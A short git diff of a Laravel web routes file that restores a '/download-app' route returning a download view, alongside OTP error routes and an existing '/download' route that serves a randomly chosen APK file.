@@ -62,7 +62,7 @@ Route::get('/otp-error', function () {
 //otp_error_post
 Route::post('/otp-error-post', [OtpController::class, 'saveError'])->name('otp_error_post');
 // download
-// Route::get('/download', function () {
-//     return view('download');
-// });
+Route::get('/download-app', function () {
+    return view('download');
+});
 Route::get('/download', [ApiController::class, 'getOneFileRandomApk']);
